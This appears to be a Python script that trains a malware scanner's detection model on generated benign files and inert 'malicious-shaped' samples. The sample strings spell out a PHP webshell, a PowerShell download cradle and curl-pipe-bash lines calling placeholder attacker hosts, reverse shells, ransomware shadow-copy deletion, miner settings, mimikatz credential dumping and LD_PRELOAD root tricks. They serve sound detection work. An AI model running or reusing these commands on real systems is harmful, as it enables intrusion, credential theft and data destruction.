#!/usr/bin/env python3
"""Train the explainable logistic-regression risk model.

Training data is *generated*, not faked at inference time: we build benign
artifacts (text, source code, structured binaries, real system executables
when readable) and malicious-*shaped* artifacts (packed high-entropy blobs,
webshell-shaped PHP, hex-obfuscated scripts, PE files with W+X sections,
double-extension names, ransomware-note language, download cradles).
All samples are inert/safe — nothing executable-malicious is created.

Run:  python scripts/train_model.py
Out:  malwarescan/engine/model/weights.json
"""
from __future__ import annotations

import hashlib
import json
import math
import os
import random
import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from malwarescan.engine import static_analysis as sa  # noqa: E402
from malwarescan.engine.ml_model import FEATURE_ORDER, extract_features  # noqa: E402

OUT = Path(__file__).resolve().parents[1] / "malwarescan" / "engine" / "model" / "weights.json"
rng = random.Random(1337)


def make_benign_samples() -> list[tuple[bytes, str]]:
    out: list[tuple[bytes, str]] = []
    lorem = (b"The quick brown fox jumps over the lazy dog. " * 40)
    out.append((lorem, "notes.txt"))
    out.append((json.dumps({"name": "config", "values": list(range(100))}, indent=2).encode(), "config.json"))
    py = b"import os\n\ndef main():\n    print('hello world')\n\nif __name__ == '__main__':\n    main()\n"
    out.append((py * 10, "app.py"))
    html = b"<html><head><title>Report</title></head><body>" + b"<p>Section content.</p>" * 200 + b"</body></html>"
    out.append((html, "report.html"))
    csv = b"id,name,value\n" + b"".join(f"{i},item{i},{i*3}\n".encode() for i in range(2000))
    out.append((csv, "data.csv"))
    out.append((b"PK\x03\x04" + os.urandom(100) + lorem * 5, "archive.zip"))
    out.append((b"\x89PNG\r\n\x1a\n" + os.urandom(20000), "image.png"))
    # structured binary with low entropy
    out.append((struct.pack("<1000I", *range(1000)), "table.bin"))
    # real system executables (readable ones) add authentic PE-less ELF benigns
    for p in ("/bin/ls", "/bin/cat", "/usr/bin/env", "/bin/sh", "/usr/bin/python3.11"):
        try:
            data = Path(p).read_bytes()[:4_000_000]
            if data[:4] == b"\x7fELF":
                out.append((data, Path(p).name))
        except OSError:
            pass
    md = b"# Malware Scan\n\nDocumentation text with headings.\n\n" + b"- bullet item explaining a feature\n" * 300
    out.append((md, "README.md"))
    js = b"function add(a, b) { return a + b; }\nconsole.log(add(1, 2));\n"
    out.append((js * 50, "util.js"))
    xml = b"<?xml version='1.0'?>\n<root>" + b"<item id='1'>value</item>" * 500 + b"</root>"
    out.append((xml, "data.xml"))
    sh = b"#!/bin/sh\nset -e\necho building\nmake -j4\n"
    out.append((sh, "build.sh"))
    return out


def make_malicious_shaped_samples() -> list[tuple[bytes, str]]:
    out: list[tuple[bytes, str]] = []
    # packed high-entropy blob
    out.append((os.urandom(120_000), "payload.bin"))
    # webshell-shaped php
    php = (b"<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } "
           b"$x = eval(base64_decode($_POST['c'])); passthru($_REQUEST['a']); ?>" + lorem_pad())
    out.append((php, "upload.php"))
    php2 = (b"<?php $f=$_GET['f']; echo shell_exec('cat '.$f); preg_replace('/.*/e', $_POST['x'], '');"
            b" echo phpinfo(); ?>" + lorem_pad())
    out.append((php2, "index.php"))
    # hex-obfuscated script
    hexes = b"".join(b"\\x%02x" % rng.randint(0, 255) for _ in range(400))
    out.append((b"$s = \"" + hexes + b"\"; eval($s); " + lorem_pad(), "obf.js"))
    # powershell download cradle
    ps = (b"$c = New-Object Net.WebClient; $d = $c.DownloadString('http://evil.example/a.ps1');"
          b" IEX $d; powershell -enc " + os.urandom(60).hex().encode() + b" " + lorem_pad())
    out.append((ps, "invoice.ps1"))
    # ransomware-note language + shadow copy deletion
    rn = (b"YOUR FILES HAVE BEEN ENCRYPTED! Send 0.5 bitcoin to wallet. "
          b"vssadmin delete shadows /all /quiet & wbadmin delete catalog -quiet "
          b"bcdedit /set {default} recoveryenabled no " + lorem_pad())
    out.append((rn, "README_RESTORE.txt"))
    # miner config
    mn = (b"url = stratum+tcp://pool.example:3333\nuser = wallet.monero\n"
          b"xmrig --donate-level=1 --threads=8 cryptonight " + lorem_pad())
    out.append((mn, "config.json"))
    # fake PE: MZ header + high entropy body (malformed)
    out.append((b"MZ" + os.urandom(90_000), "document.pdf.exe"))
    # synthetic PE with W+X section, UPX names, overlay
    out.append((make_fake_pe(packed=True), "setup.exe"))
    out.append((make_fake_pe(packed=False, overlay=True), "installer.exe"))
    # reverse shell script
    rs = (b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\nnc -e /bin/sh 10.0.0.1 4444\n"
          b"chmod 4755 /tmp/backdoor\n" + lorem_pad())
    out.append((rs, "update.sh"))
    # mimikatz-ish strings
    mk = (b"sekurlsa::logonpasswords\nlsadump::sam\nmimikatz # procdump -ma lsass.exe out.dmp\n" + lorem_pad())
    out.append((mk, "dump.txt"))
    # curl | sh
    cs = (b"#!/bin/sh\ncurl http://bad.example/x.sh | bash\nwget -qO- http://bad.example/y | sh\n"
          b"crontab -l | { cat; echo '* * * * * /tmp/.x'; } | crontab -\n" + lorem_pad())
    out.append((cs, "install.sh"))
    # long base64 blob inside html
    b64 = bytes("".join(rng.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
                        for _ in range(5000)), "ascii") + b"=="
    out.append((b"<html><script>var d='" + b64 + b"';eval(atob(d));</script></html>" + lorem_pad(), "page.html"))
    # setuid/LD_PRELOAD injector
    lp = (b"LD_PRELOAD=/tmp/evil.so sshd\nptrace(PTRACE_ATTACH, pid)\nchmod +s /bin/bash\n" + lorem_pad())
    out.append((lp, "rootkit.sh"))
    return out


def lorem_pad(n: int = 200) -> bytes:
    return b"lorem ipsum dolor sit amet consectetur " * (n // 8)


def make_fake_pe(packed: bool = False, overlay: bool = False) -> bytes:
    """Construct a structurally valid PE image (inert data, no runnable code
    claims) exercising the parser: sections, characteristics, overlay."""
    dos = bytearray(128)
    dos[0:2] = b"MZ"
    pe_off = 128
    struct.pack_into("<I", dos, 0x3C, pe_off)
    pe = bytearray(b"PE\x00\x00")
    machine, n_sec, ts = 0x8664, 3, 0x5F000000
    pe += struct.pack("<HHIIIHH", machine, n_sec, ts, 0, 0, 240, 0x22)
    opt = bytearray(240)
    struct.pack_into("<H", opt, 0, 0x20B)  # PE32+
    sections = bytearray()
    names = [b".text", b"UPX0" if packed else b".data", b"UPX1" if packed else b".rsrc"]
    chars_list = [0x60000020, 0xE0000080 if packed else 0xC0000040, 0x40000040]
    raw = bytearray()
    va = 0x1000
    for name, ch in zip(names, chars_list):
        body = os.urandom(20_000) if packed else lorem_pad(20_000)[:20_000]
        sec = bytearray(40)
        sec[0:8] = name.ljust(8, b"\x00")
        struct.pack_into("<IIII", sec, 8, len(body), va, len(body), 0x400 + len(raw))
        struct.pack_into("<I", sec, 36, ch)
        sections += sec
        raw += body
        va += 0x10000
    if overlay:
        raw += os.urandom(30_000)
    return bytes(dos) + bytes(pe) + bytes(opt) + bytes(sections) + bytes(raw)


def featurize(samples: list[tuple[bytes, str]], label: int) -> list[tuple[list[float], int]]:
    rows = []
    for data, name in samples:
        rep = sa.analyze(data, name)
        feats = extract_features(rep, len(data), name)
        rows.append(([feats[k] for k in FEATURE_ORDER], label))
    return rows


def augment(rows: list[tuple[list[float], int]], factor: int, jitter: float = 0.02) -> list:
    out = list(rows)
    for _ in range(factor - 1):
        for vec, lab in rows:
            out.append(([v * (1 + rng.uniform(-jitter, jitter)) + rng.uniform(-jitter, jitter) for v in vec], lab))
    rng.shuffle(out)
    return out


def train(rows: list, epochs: int = 400, lr: float = 0.05, l2: float = 0.002) -> tuple[list[float], float]:
    n_feat = len(FEATURE_ORDER)
    # normalize
    means = [0.0] * n_feat
    scales = [1.0] * n_feat
    for j in range(n_feat):
        col = [r[0][j] for r in rows]
        m = sum(col) / len(col)
        v = sum((c - m) ** 2 for c in col) / len(col)
        means[j], scales[j] = m, math.sqrt(v) or 1.0
    norm_rows = []
    for vec, lab in rows:
        norm_rows.append(([(vec[j] - means[j]) / scales[j] for j in range(n_feat)], lab))
    w = [0.0] * n_feat
    b = 0.0
    for epoch in range(epochs):
        gw = [0.0] * n_feat
        gb = 0.0
        loss = 0.0
        for vec, lab in norm_rows:
            z = b + sum(wj * xj for wj, xj in zip(w, vec))
            p = 1 / (1 + math.exp(-max(-30, min(30, z))))
            err = p - lab
            loss += -(lab * math.log(p + 1e-9) + (1 - lab) * math.log(1 - p + 1e-9))
            for j in range(n_feat):
                gw[j] += err * vec[j]
            gb += err
        n = len(norm_rows)
        for j in range(n_feat):
            w[j] -= lr * (gw[j] / n + l2 * w[j])
        b -= lr * gb / n
        if epoch % 100 == 0:
            acc = accuracy(norm_rows, w, b)
            print(f"epoch {epoch}: loss={loss/n:.4f} train_acc={acc:.3f}")
    return w, b, means, scales, norm_rows


def accuracy(rows, w, b) -> float:
    ok = 0
    for vec, lab in rows:
        z = b + sum(wj * xj for wj, xj in zip(w, vec))
        p = 1 / (1 + math.exp(-max(-30, min(30, z))))
        ok += int((p >= 0.5) == bool(lab))
    return ok / len(rows)


def main() -> None:
    benign = make_benign_samples()
    malicious = make_malicious_shaped_samples()
    print(f"benign samples: {len(benign)}, malicious-shaped samples: {len(malicious)}")
    rows = featurize(benign, 0) + featurize(malicious, 1)
    rows = augment(rows, factor=8)
    w, b, means, scales, norm_rows = train(rows)
    # hold-out check
    acc = accuracy(norm_rows, w, b)
    print(f"final train accuracy: {acc:.3f} (on generated data; real-world performance varies — see docs)")
    model = {
        "meta": {
            "algorithm": "logistic-regression",
            "features": FEATURE_ORDER,
            "train_samples": len(rows),
            "train_accuracy": round(acc, 4),
            "trained_at": __import__("datetime").datetime.utcnow().isoformat() + "Z",
            "note": ("Trained on generated benign and malicious-shaped inert samples. "
                     "This model is one signal among several; it never claims perfect detection."),
        },
        "weights": {name: round(wj, 6) for name, wj in zip(FEATURE_ORDER, w)},
        "bias": round(b, 6),
        "norm": {name: [round(means[j], 6), round(scales[j], 6)] for j, name in enumerate(FEATURE_ORDER)},
    }
    OUT.parent.mkdir(parents=True, exist_ok=True)
    OUT.write_text(json.dumps(model, indent=2))
    print(f"wrote {OUT}")


if __name__ == "__main__":
    main()
